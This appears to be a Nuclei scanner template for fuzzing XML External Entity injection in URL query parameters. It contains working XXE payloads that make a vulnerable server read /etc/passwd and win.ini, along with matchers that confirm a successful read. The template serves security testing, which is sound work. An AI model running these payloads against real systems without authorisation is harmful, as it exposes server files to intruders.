http:
- fuzzing:
  - fuzz:
    - '{{xxe}}'
    keys-regex:
    - (.*?)xml(.*?)
    part: query
  - fuzz:
    - '{{xxe}}'
    part: query
    values:
    - (<!DOCTYPE|<?xml|%3C!DOCTYPE|%3C%3Fxml)(.*?)>
  matchers:
  - name: linux
    part: body
    regex:
    - 'root:.*?:[0-9]*:[0-9]*:'
    type: regex
  - name: windows
    part: body
    type: word
    words:
    - for 16-bit app support
  matchers-condition: or
  method: GET
  path:
  - '{{BaseURL}}'
  payloads:
    xxe:
    - <!DOCTYPE {{rletter}} [ <!ENTITY {{rletter}} SYSTEM "file:///c:/windows/win.ini">
      ]><x>&{{rletter}};</x>
    - <!DOCTYPE {{rletter}} [ <!ENTITY {{rletter}} SYSTEM "file:////etc/passwd"> ]><x>&{{rletter}};</x>
  stop-at-first-match: true
id: fuzz-xxe
info:
  author: pwnhxl
  name: XXE Fuzzing
  reference:
  - https://github.com/andresriancho/w3af/blob/master/w3af/plugins/audit/xxe.py
  severity: medium
  tags: dast,xxe
variables:
  rletter: '{{rand_base(6,''abc'')}}'
